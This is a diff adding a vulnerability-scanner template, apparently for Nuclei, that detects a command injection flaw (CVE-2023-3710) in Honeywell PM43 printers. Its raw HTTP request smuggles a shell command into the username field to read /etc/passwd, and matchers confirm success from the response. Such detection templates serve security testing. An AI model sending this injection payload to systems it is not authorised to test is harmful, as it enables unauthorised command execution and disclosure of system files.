@@ -1,0 +1,28 @@
+id: honeywell-pm43-command-injection
+info:
+  name: Honeywell PM43 Printers Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CVE-2023-3710
+  description: |
+    This template detects a command injection vulnerability in Honeywell PM43 printers allowing unauthorized access to sensitive system files.
+
+http:
+  - raw:
+      - |
+        POST /loadfile.lp?pageid=Configure HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=x%0aid;cat+/etc/passwd%0a&userpassword=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid"
+          - "root:"
+          - "/bin"
